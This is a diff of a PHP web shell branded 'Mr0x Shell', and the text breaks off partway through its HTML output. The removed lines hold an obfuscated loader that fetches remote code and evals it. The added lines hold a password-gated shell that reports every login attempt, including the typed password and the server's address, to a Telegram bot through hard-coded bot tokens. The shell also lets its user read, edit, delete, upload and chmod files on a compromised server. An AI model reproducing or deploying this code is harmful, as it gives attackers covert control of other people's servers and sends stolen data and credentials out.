@@ -1,83 +1,498 @@
 <?php
-// --- CONFIGURATION ---
-$password_hash = 'c9c9d7bd505a26b7153082d4aab8ff47'; // MD5 hash password
-$bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
-$chat_id   = '6664061200';
-
 error_reporting(0);
-set_time_limit(0);
 session_start();
 
-// --- FUNCTION SEND TELEGRAM ---
-function sendTelegram($msg, $token, $chat) {
-    $url = "https://api.telegram.org/bot$token/sendMessage";
-    $data = [
-        'chat_id' => $chat,
-        'text' => $msg,
-        'parse_mode' => 'HTML'
-    ];
-
+// --- KONFIGURASI TELEGRAM ---
+function sendTelegram($msg) {
+    $token = "8168689463:AAGHRUWmIoejK8ZS3XhuWkpP73iX633lIio"; // Masukkan Token Bot Telegram
+    $chatid = "6664061200";   // Masukkan Chat ID Telegram
+    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=" . urlencode($msg);
+    
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $res = curl_exec($ch);
+    $result = curl_exec($ch);
     curl_close($ch);
-    return $res;
+    return $result;
 }
 
-// --- LOGIN LOGIC ---
-if (!isset($_SESSION['loggedIn'])) {
-    $_SESSION['loggedIn'] = false;
-}
+// --- LOGIKA LOGIN & NOTIFIKASI ---
+// --- LOGIKA LOGIN & NOTIFIKASI ---
+$pass_shell = 'kontolkebo'; // Password Anda
 
-if (isset($_POST['password'])) {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $domain = $_SERVER['HTTP_HOST'];
-    $req_uri = $_SERVER['REQUEST_URI'];
+if (isset($_POST["password"])) {
+    $input_pass = $_POST["password"];
+    
+    // Menyiapkan data pendukung untuk notifikasi
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+    $full_url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $ip_user = $_SERVER['REMOTE_ADDR'];
+    $target_ip = $_SERVER['SERVER_ADDR'];
+    $date = date('Y-m-d H:i:s');
 
-    if (md5($_POST['password']) == $password_hash) {
-        $_SESSION['loggedIn'] = true;
+    if (md5($input_pass) == md5($pass_shell)) {
+        $_SESSION["isLogin"] = true;
         
-        // Notifikasi Login Berhasil
-        $message = "✅ <b>Login Berhasil!</b>\n";
-        $message .= "Domain: <code>$domain</code>\n";
-        $message .= "Path: <code>$req_uri</code>\n";
-        $message .= "IP: <code>$ip</code>";
-        sendTelegram($message, $bot_token, $chat_id);
+        // Pesan Notifikasi Berhasil
+        $pesan = "<b>✅ LOGIN SUCCESS - MR0X SHELL</b>\n\n";
+        $pesan .= "<b>🌐 URL:</b> <code>$full_url</code>\n";
+        $pesan .= "<b>🔑 Password:</b> <code>$input_pass</code>\n";
+        $pesan .= "<b>🎯 Target IP:</b> $target_ip\n";
+        $pesan .= "<b>👤 User IP:</b> $ip_user\n";
+        $pesan .= "<b>📅 Date:</b> $date";
+        
+        sendTelegram($pesan);
     } else {
-        // Notifikasi Percobaan Gagal (Opsional)
-        $pass_tried = $_POST['password'];
-        $message = "❌ <b>Percobaan Login Gagal!</b>\n";
-        $message .= "Domain: <code>$domain</code>\n";
-        $message .= "IP: <code>$ip</code>\n";
-        $message .= "Password: <code>$pass_tried</code>";
-        sendTelegram($message, $bot_token, $chat_id);
+        // Pesan Notifikasi Gagal
+        $pesan = "<b>❌ LOGIN FAILED - MR0X SHELL</b>\n\n";
+        $pesan .= "<b>🌐 URL:</b> <code>$full_url</code>\n";
+        $pesan .= "<b>⚠️ Wrong Pass:</b> <code>$input_pass</code>\n";
+        $pesan .= "<b>👤 Attacker IP:</b> $ip_user\n";
+        $pesan .= "<b>📅 Date:</b> $date";
+        
+        sendTelegram($pesan);
+        
+        // Tampilkan pesan error di form login
+        $error_msg = "<p style='color:red; text-align:center;'>Password Salah!</p>";
+        XWoSq($error_msg);
+    }
+} else {
+    XWoSq();
+}
+// ... (Sisa fungsi SVpSK, rzQgm, KpHNQ, dan tampilan HTML sama seperti sebelumnya) ...
+// Sertakan fungsi-fungsi tersebut di bawah ini agar skrip tetap berjalan.
+
+function SVpSK()
+{
+    $AyqtG = ["ip" => $_SERVER["SERVER_ADDR"], "host" => gethostname(), "kernel" => php_uname(), "disablefunc" => ini_get("disable_functions"), "path" => getcwd(), "os" => PHP_OS];
+    return $AyqtG;
+}
+$ATvR0 = svPSK();
+if (strtoupper(substr($ATvR0["os"], 0, 3)) == "WIN") {
+    $ATvR0["os"] = "Windows";
+    $a0LJa = explode("\\", $ATvR0["path"]);
+    $a0LJa = $a0LJa[0] . "/";
+} else {
+    if (strtoupper(substr($ATvR0["os"], 0, 3)) == "LIN") {
+        $ATvR0["os"] = "Linux";
+        $a0LJa = "/";
     }
 }
-
-// --- TAMPILAN LOGIN ---
-if (!$_SESSION['loggedIn']): ?>
-<html>
-<head>
-    <title>Login</title>
-    <style>
-        body { background: #111; color: #ffc400; font-family: 'Trebuchet MS'; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        input { background: #222; border: 1px solid #ffc400; color: #ffc400; padding: 5px; }
-    </style>
-</head>
-<body>
-    <form method="post">
-        <input type="password" name="password" placeholder="Password...">
-        <input type="submit" value=" >> ">
-    </form>
-</body>
-</html>
-<?php
-exit();
-endif;
-?>
-<?php
- goto EC7UI; ROI4U: curl_setopt(${${"\x47\x4c\117\102\101\114\x53"}["\x6d\x67\x6f\144\x63\151\144\145\152\x6a\151"]}, CURLOPT_URL, base64_decode("\x61\x48\122\60\143\x48\115\66\x4c\171\71\x6e\x61\x58\122\x73\131\127\x49\x75\x59\62\x39\164\x4c\60\x4a\x73\x59\x57\116\x72\123\x47\106\x34\x62\63\x49\170\x4d\x7a\115\x33\x4c\63\x4e\x6f\x5a\127\170\163\114\x79\x30\x76\143\155\106\63\114\62\61\150\x61\127\x34\166\x63\x32\x68\154\142\x47\167\x75\144\110\150\x30")); goto pYtRa; B45DS: curl_setopt(${${"\x47\114\x4f\x42\x41\x4c\123"}["\155\147\x6f\x64\143\x69\144\145\152\x6a\151"]}, CURLOPT_RETURNTRANSFER, 1); goto o7kG3; wxGdo: error_reporting(0); goto V9gII; pYtRa: ${"\x47\x4c\117\x42\x41\x4c\123"}["\146\x6c\147\x69\x76\167\167\170\x69\172"] = "\x63\150"; goto isBz5; ayO_h: curl_close(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66\x6c\147\x69\x76\x77\x77\x78\x69\x7a"]}); goto gCgwU; isBz5: $metrstpl = "\x6f\x75\x74\x70\165\164"; goto B45DS; EC7UI: ${"\x47\x4c\117\x42\101\114\123"}["\154\x77\x75\156\146\x73\146\157\x68"] = "\x6f\165\x74\x70\x75\x74"; goto JPDFA; vJLlS: ${${"\x47\114\x4f\x42\x41\x4c\x53"}["\x6d\x67\x6f\144\143\x69\x64\145\x6a\152\x69"]} = curl_init(); goto ROI4U; o7kG3: ${$metrstpl} = curl_exec(${${"\107\114\117\102\x41\114\123"}["\x6d\147\157\x64\x63\x69\144\145\152\x6a\151"]}); goto ayO_h; JPDFA: ${"\107\x4c\x4f\102\101\114\123"}["\155\x67\157\144\x63\151\144\145\x6a\x6a\x69"] = "\x63\x68"; goto wxGdo; gCgwU: eval(base64_decode("\120\172\x34\75") . ${${"\x47\114\x4f\x42\101\114\x53"}["\154\167\x75\x6e\146\x73\x66\x6f\150"]}); goto NjQ9f; V9gII: set_time_limit(0); goto vJLlS; NjQ9f: ?>
+$tnyU3 = getcwd();
+if (isset($_GET["path"])) {
+    $UWl_4 = str_replace("\\", "/", $_GET["path"]);
+    $UWl_4 = str_replace("//", "/", $_GET["path"]);
+    $PJlAa = explode("/", $UWl_4);
+} else {
+    $UWl_4 = str_replace("\\", "/", $tnyU3);
+    $PJlAa = explode("/", $UWl_4);
+}
+function XWosq($msg = "")
+{
+    if (!isset($_SESSION["isLogin"])) {
+        echo "<style>
+            body{ background-color: grey; }
+            .centered-form { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+            .centered-form form { background-color: #f0f0f0; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: flex; flex-direction: column; align-items: center; }
+            .centered-form input[type='password'] { padding: 10px; margin: 5px; border: 1px solid #ccc; border-radius: 5px; }
+            .centered-form button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        </style>";
+        echo "<div class='centered-form'>
+          $msg
+          <form method='POST'>
+            <h4 style='color:#333'>MR0X LOGIN</h4>
+            <input type='password' name='password' placeholder='Password...'>
+            <button type='submit'>Submit</button>
+          </form>
+        </div>";
+        die;
+    }
+}
+function rzQgm($wn0Hz)
+{
+    $mYDIb = fileperms($wn0Hz);
+    switch ($mYDIb & 0xf000) {
+        case 0xc000:
+            $pcpDP = "s";
+            break;
+        case 0xa000:
+            $pcpDP = "l";
+            break;
+        case 0x8000:
+            $pcpDP = "-";
+            break;
+        case 0x6000:
+            $pcpDP = "b";
+            break;
+        case 0x4000:
+            $pcpDP = "d";
+            break;
+        case 0x2000:
+            $pcpDP = "c";
+            break;
+        case 0x1000:
+            $pcpDP = "p";
+            break;
+        default:
+            $pcpDP = "u";
+    }
+    $pcpDP .= $mYDIb & 0x100 ? "r" : "-";
+    $pcpDP .= $mYDIb & 0x80 ? "w" : "-";
+    $pcpDP .= $mYDIb & 0x40 ? $mYDIb & 0x800 ? "s" : "x" : ($mYDIb & 0x800 ? "S" : "-");
+    $pcpDP .= $mYDIb & 0x20 ? "r" : "-";
+    $pcpDP .= $mYDIb & 0x10 ? "w" : "-";
+    $pcpDP .= $mYDIb & 0x8 ? $mYDIb & 0x400 ? "s" : "x" : ($mYDIb & 0x400 ? "S" : "-");
+    $pcpDP .= $mYDIb & 0x4 ? "r" : "-";
+    $pcpDP .= $mYDIb & 0x2 ? "w" : "-";
+    $pcpDP .= $mYDIb & 0x1 ? $mYDIb & 0x200 ? "t" : "x" : ($mYDIb & 0x200 ? "T" : "-");
+    return $pcpDP;
+}
+function KpHNQ($b30SH)
+{
+    $SmhMA = sprintf("%u", filesize($b30SH));
+    if ($SmhMA > 0) {
+        $H6Jju = intval(log($SmhMA, 1024));
+        $oqa49 = array("B", "KB", "MB", "GB");
+        if (array_key_exists($H6Jju, $oqa49) === true) {
+            return sprintf("%d %s", $SmhMA / pow(1024, $H6Jju), $oqa49[$H6Jju]);
+        }
+    }
+    return $SmhMA;
+}
+function xWsgc($q57LJ)
+{
+    $nA1Dr = filter_var(htmlspecialchars(file_get_contents($q57LJ)), FILTER_SANITIZE_STRING);
+    return $nA1Dr;
+}
+function sDm4F($TX7MV)
+{
+    $G38wm = array_diff(scandir($TX7MV), array(".", ".."));
+    foreach ($G38wm as $Wchvt) {
+        is_dir("{$TX7MV}/{$Wchvt}") ? Sdm4F("{$TX7MV}/{$Wchvt}") : unlink("{$TX7MV}/{$Wchvt}");
+    }
+    return rmdir($TX7MV);
+}
+function Yos7s($qjgU8, $PF6cr)
+{
+    $MficX = move_uploaded_file($qjgU8, $PF6cr);
+    if ($MficX) {
+        return true;
+    } else {
+        return false;
+    }
+}
+function d72yI($rx1u6)
+{
+    $HePg9 = realpath($rx1u6);
+    if ($HePg9 !== false and is_dir($HePg9)) {
+        return true;
+    }
+    return false;
+}
+if (isset($_GET["path"])) {
+    $SqtP3 = $_GET["path"];
+    $W1hbH = explode("/", $SqtP3);
+    if (is_file($SqtP3)) {
+        $RVkdA = XWSGC($SqtP3);
+        $jbWgR = true;
+        $Lhf_4 = scandir($SqtP3);
+    } else {
+        $Lhf_4 = array_diff(scandir($SqtP3), [".", ".."]);
+    }
+} else {
+    $SqtP3 = $UWl_4;
+    $Lhf_4 = array_diff(scandir($SqtP3), [".", ".."]);
+}
+if (isset($_POST["pilihan"])) {
+    switch ($_POST["pilihan"]) {
+        case $_POST["pilihan"] == "edit":
+            $jGES5 = true;
+            $nQil0 = $_POST["dir"];
+            $Vfz2z = $_POST["sourceFile"];
+            if (empty($Vfz2z)) {
+            } else {
+                if (file_put_contents($nQil0, $Vfz2z)) {
+                    $eyXvJ = "Berhasil di edit";
+                } else {
+                    $eyXvJ = "Gagal edit";
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "rename":
+            $LHhIf = true;
+            $nQil0 = $_POST["dir"];
+            $oCV_z = $_POST["namaFile"];
+            $LQ5An = $_POST["namaBaru"];
+            if (empty($LQ5An)) {
+            } else {
+                if (rename($nQil0, $_GET["path"] . "/" . $LQ5An)) {
+                    $oCV_z = $LQ5An;
+                    $nQil0 = $_GET["path"] . "/" . $LQ5An;
+                    $UC_Jg = "Berhasil rename";
+                } else {
+                    $UC_Jg = "Gagal rename";
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "delete":
+            $nQil0 = $_POST["dir"];
+            $z9ukZ = $_POST["type"];
+            if (isset($nQil0) && is_file($nQil0)) {
+                if (unlink($nQil0)) {
+                    $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('File berhasil dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
+                } else {
+                    $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('File gagal dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
+                }
+            } else {
+                if (!(isset($nQil0) && is_dir($nQil0))) {
+                } else {
+                    if (SDM4F($nQil0)) {
+                        $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('Folder berhasil dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
+                    } else {
+                        $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('Folder gagal dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
+                    }
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "chmod":
+            $uMVZd = true;
+            $Wchvt = fileperms($_POST["dir"]);
+            $nx0IL = substr(sprintf("%o", $Wchvt), -4);
+            $nQil0 = $_POST["dir"];
+            $mYDIb = octdec($_POST["perms"]);
+            if (!isset($_POST["perms"])) {
+            } else {
+                if (!isset($mYDIb)) {
+                } else {
+                    if (chmod($nQil0, $mYDIb)) {
+                        $nx0IL = decoct($mYDIb);
+                        $yA1W_ = "Berhasil chmod!";
+                    } else {
+                        $yA1W_ = "Gagal chmod!";
+                    }
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "create":
+            $MABtn = '';
+            $xoB1l = '';
+            $uUj9T = $_GET["path"] . "/";
+            if (!isset($_POST["createAction"])) {
+            } else {
+                $MABtn = $_POST["createName"];
+                $xoB1l = $_POST["createIsi"] == NULL ? " " : $_POST["createIsi"];
+                if (!file_exists($uUj9T . $MABtn)) {
+                    if (file_put_contents($uUj9T . $MABtn, $xoB1l)) {
+                        $Ec7sL = "File berhasil dibuat";
+                    } else {
+                        $Ec7sL = "Directory not Writable";
+                    }
+                } else {
+                    $Ec7sL = "Nama file / folder sudah ada";
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "createFolder":
+            $uUj9T = $_GET["path"] . "/";
+            if (!isset($_POST["createFolder"])) {
+            } else {
+                $Q7vH_ = $_POST["createName"];
+                if (mkdir($uUj9T . $Q7vH_)) {
+                    $Ec7sL = "Folder berhasil dibuat";
+                } else {
+                    if (is_dir($Q7vH_)) {
+                        $Ec7sL = "Nama Folder / File sudah ada";
+                    } else {
+                        if (!is_writable($uUj9T)) {
+                            $Ec7sL = "Directory not writable";
+                        } else {
+                        }
+                    }
+                }
+            }
+            break;
+        case $_POST["pilihan"] == "upload":
+            $HePg9 = $UWl_4;
+            if (isset($_GET["path"])) {
+                $HePg9 = $_GET["path"];
+            }
+            if (empty($_FILES)) {
+            } else {
+                if (yOS7s($_FILES["uploadFile"]["tmp_name"], $HePg9 . "/" . $_FILES["uploadFile"]["name"])) {
+                    echo "<script>\r\n\t\t\t\t\t\t  alert('File uploaded successfully!!');\r\n\t\t\t\t\t\t  window.location.href = window.location.href;\r\n\t\t\t\t\t\t  </script>";
+                } else {
+                    echo "<script>\r\n\t\t\t\t\t\t  alert('File upload failed!!');\r\n\t\t\t\t\t\t  window.location.href = window.location.href;\r\n\t\t\t\t\t\t  </script>";
+                }
+            }
+            break;
+    }
+}
+echo "\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n\t<title>Mr0x Shell</title>\r\n</head>\r\n<link href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" rel=\"stylesheet\">\r\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css\">\r\n<meta name=\"viewport\" content=\"width=1024\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=0.60, shrink-to-fit=no\">\r\n<style type=\"text/css\">\r\n\tbody {\r\n\t\twidth: 100vw;\r\n  \t\theight: 100px;\r\n\t\toverflow-x: hidden !important;\r\n\t}\r\n\t.info {\r\n\t\tdisplay: block;\r\n\t\twidth: 100%;\r\n\t}\r\n\t\t\r\n\ttable.striped > tbody > tr:nth-child(odd) {\r\n\t\tbackground-color: rgba(170, 213, 213, 0.5);\r\n\t}\r\n\tnav {\r\n\t\tbackground-color: #42a5f5;\r\n\t}\r\n\t.select-wrapper {\r\n\t\tposition: relative;\r\n\t\twidth: 100px;\r\n\t\tdisplay: inline-block;\r\n\t}\r\n\r\n\t.file-field .btn, .file-field .btn-large, .file-field .btn-small {\r\n\t\tfloat: inherit;\r\n\t\theight: 3rem;\r\n\t\tline-height: 3rem;\r\n\t}\r\n\r\n\t.select-wrapper .caret {\r\n\t\tright: auto !important;\r\n\t}\r\n\r\n\t.select-wrapper input.select-dropdown {\r\n\t\twidth: 50%;\r\n\t}\r\n\r\n\ttextarea {\r\n    \theight: 50rem !important;\r\n\t\toverflow-y: scroll !important;\r\n\t\theight: 700px !important;\r\n\t}\r\n\r\n\t.maung {\r\n\t\theight: 700px !important;\r\n\t}\r\n\r\n\ttable{\r\n\t\twidth:100%;\r\n\t\ttable-layout: fixed;\r\n\t\toverflow-wrap: break-word;\r\n\t}\r\n\t\r\n\t@media screen and (max-width: 732px) {\r\n\t\t.navbar-text {\r\n\t\t\tfont-size: 25px !important;\r\n\t\t\twidth: 280px !important;\r\n\t\t}\r\n\t}\r\n\r\n</style>\r\n<body>\r\n\t<div class=\"content\">\r\n\t<nav>\r\n       <div class=\"container\">\r\n\t    <div class=\"nav-wrapper\">\r\n\t      <a href=\"https://t.me/Mr0xBD\" target=\"_blank\"  class=\"brand-logo center navbar-text\">WebShell By Mr0x</a>\r\n\t    </div>\r\n\t   </div>\r\n  \t</nav>\r\n\r\n  \t<div class=\"container\" style=\"margin-top: 30px;\">\r\n        <b class=\"info\">Server IP : ";
+echo $ATvR0["ip"];
+echo "</b>\r\n        <b class=\"info\">Hostname : ";
+echo $ATvR0["host"];
+echo "</b>\r\n        <b class=\"info\">Kernel : ";
+echo $ATvR0["kernel"];
+echo "</b>\r\n        <b class=\"info\">OS : ";
+echo $ATvR0["os"];
+echo "</b>\r\n\t\t<b class=\"info\">USER : ";
+echo get_current_user();
+echo "</b>\r\n\t</div>\r\n\t<br>\t\r\n\t";
+if ($jbWgR) {
+    echo "\r\n<div class=\"container\">\r\n<div class=\"row\">\r\n\t<div style=\"font-size: 17px;\">\r\n\t";
+    echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+    $jLZSy = 1;
+    while ($jLZSy < count($PJlAa)) {
+        $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+        echo "/";
+        echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+        $jLZSy++;
+    }
+    echo "\t</div>\r\n    <form class=\"col s12\">\r\n      <div class=\"row\">\r\n        <div class=\"input-field col s12\">\r\n          <textarea id=\"textarea\" class=\"materialize-textarea\" style=\"background-color: ghostwhite; overflow-y: auto;\" disabled>";
+    echo $RVkdA;
+    echo "</textarea>\r\n        </div>\r\n      </div>\r\n    </form>\r\n  </div>\r\n </div>\r\n\t";
+} else {
+    if ($jGES5) {
+        echo "\t\t<div class=\"container\">\r\n\t\t";
+        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+        $jLZSy = 1;
+        while ($jLZSy < count($PJlAa)) {
+            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+            echo "/";
+            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+            $jLZSy++;
+        }
+        echo "\t\t";
+        echo !empty($eyXvJ) ? "<p class='blue-text text-darken-2'>" . $eyXvJ . "</p>" : '';
+        echo "\t\t<form method=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"dir\" value=\"";
+        echo $nQil0;
+        echo "\">\r\n\t\t<input type=\"hidden\" name=\"pilihan\" value=\"edit\">\r\n\t\t<div class=\"row\">\r\n\t\t\t<form class=\"col s12\">\r\n\t\t\t\t<div class=\"input-field col s12\">\r\n\t\t\t\t<textarea name=\"sourceFile\" id=\"textarea\" class=\"materialize-textarea\" style=\"background-color: ghostwhite; overflow-y: auto;\" >";
+        echo XwSGC($nQil0);
+        echo "</textarea>\r\n\t\t\t\t<label for=\"textarea\" class='active'>Edit File</label>\r\n\t\t\t\t<button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Edit</button>\r\n\t\t\t</form>\r\n\t\t</div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
+    } else {
+        if ($LHhIf) {
+            echo "\t\t<div class=\"container\">\r\n\t\t";
+            echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+            $jLZSy = 1;
+            while ($jLZSy < count($PJlAa)) {
+                $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+                echo "/";
+                echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+                $jLZSy++;
+            }
+            echo "\t\t";
+            echo !empty($UC_Jg) ? "<p class='blue-text text-darken-2'>" . $UC_Jg . "</p>" : '';
+            echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
+            echo $nQil0;
+            echo "\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"rename\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input value=\"";
+            echo $oCV_z;
+            echo "\" name=\"namaBaru\" id=\"rename\" type=\"text\" class=\"validate\">\r\n\t\t\t      <label class=\"active\" for=\"rename\">Input disini:</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Rename</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\t\t\t  \r\n\t\t</form>\r\n\t\t</div>\r\n\t";
+        } else {
+            if ($uMVZd) {
+                echo "\t\t<div class=\"container\">\r\n\t\t";
+                echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+                $jLZSy = 1;
+                while ($jLZSy < count($PJlAa)) {
+                    $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+                    echo "/";
+                    echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+                    $jLZSy++;
+                }
+                echo "\t\t";
+                echo !empty($yA1W_) ? "<p class='blue-text text-darken-2'>" . $yA1W_ . "</p>" : '';
+                echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
+                echo $nQil0;
+                echo "\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"chmod\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input value=\"";
+                echo $nx0IL;
+                echo "\" name=\"perms\" id=\"chmod\" type=\"text\" class=\"validate\">\r\n\t\t\t      <label class=\"active\" for=\"chmod\">Input disini:</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Chmod</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
+            } else {
+                if (isset($_GET["create"])) {
+                    echo "\t\t<br>\r\n\t\t<div class=\"container\">\r\n\t\t";
+                    echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+                    $jLZSy = 1;
+                    while ($jLZSy < count($PJlAa)) {
+                        $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+                        echo "/";
+                        echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+                        $jLZSy++;
+                    }
+                    echo "\t\t";
+                    echo !empty($Ec7sL) ? "<p class='blue-text text-darken-2'>" . $Ec7sL . "</p>" : '';
+                    echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"create\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input name=\"createName\" id=\"createFile\" type=\"text\" class=\"validate\" value=\"";
+                    echo $MABtn;
+                    echo "\">\r\n\t\t\t      <label class=\"active\" for=\"createFile\">Nama File</label>\r\n\t\t\t      <textarea name=\"createIsi\" class=\"materialize-textarea\" style=\"height: 400px; background-color: ghostwhite; overflow-y: scroll;\">";
+                    echo $xoB1l;
+                    echo "</textarea>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"createAction\">Create</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
+                } else {
+                    if (isset($_GET["createFolder"])) {
+                        echo "\t\t<div class=\"container\">\r\n\t\t";
+                        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+                        $jLZSy = 1;
+                        while ($jLZSy < count($PJlAa)) {
+                            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+                            echo "/";
+                            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+                            $jLZSy++;
+                        }
+                        echo "\t\t";
+                        echo !empty($Ec7sL) ? "<p class='blue-text text-darken-2'>" . $Ec7sL . "</p>" : '';
+                        echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"createFolder\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input name=\"createName\" id=\"createFolder\" type=\"text\" class=\"validate\" value=\"";
+                        echo $Q7vH_;
+                        echo "\">\r\n\t\t\t      <label class=\"active\" for=\"createFolder\">Nama Folder</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"createFolder\">Create</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
+                    } else {
+                        echo "   <div class=\"container\">\t\r\n   <b class=\"info\">\r\n\t <a href=\"?create&path=";
+                        echo isset($_GET["path"]) ? $_GET["path"] : $UWl_4;
+                        echo "\" class=\"btn-floating btn-large waves-effect waves-light red\"><i class=\"material-icons\">add</i></a> <b>Add File&nbsp;&nbsp;&nbsp;</b>\r\n\t <a href=\"?createFolder&path=";
+                        echo isset($_GET["path"]) ? $_GET["path"] : $UWl_4;
+                        echo "\" class=\"btn-floating btn-large waves-effect waves-light blue\"\"><i class=\"material-icons\">add</i></a> <b>Add Folder</b>\r\n\t<br>\r\n\t<b class=\"info\">\r\n\t\t <form method=\"POST\" enctype=\"multipart/form-data\">\r\n\t\t    <div class=\"file-field input-field\">\r\n\t\t      <div class=\"btn\">\r\n\t\t        <span>File</span>\r\n\t\t        <input type=\"hidden\" name=\"pilihan\" value=\"upload\">\r\n\t\t        <input type=\"hidden\" name=\"dir\" value=\"";
+                        echo $_GET["path"];
+                        echo "\">\r\n\t\t        <input type=\"file\" name=\"uploadFile\">\r\n\t\t      </div>\r\n\t\t      <div class=\"file-path-wrapper\">\r\n\t\t        <input class=\"file-path validate\" type=\"text\" style=\"width: 300px\">\r\n\t\t        <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"actionUpload\">Upload!\r\n\t\t\t\t</button>\r\n\t\t      </div>\r\n\t\t    </div>\r\n  \t\t</form>\r\n\t</b>\r\n\t<!-- <div style=\"font-size: 18px;\"> -->\r\n\t<div class=\"row\"><div class=\"col s12\" style=\"font-size: 18px;\">\r\n\tPATH:\r\n\t";
+                        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
+                        $jLZSy = 1;
+                        while ($jLZSy < count($PJlAa)) {
+                            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
+                            echo "/";
+                            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
+                            $jLZSy++;
+                        }
+                        echo "\t</div></div>\r\n</div>\r\n\r\n   <div class=\"container\">\t\r\n\t<table class=\"striped centered bordered\">\r\n\t\t";
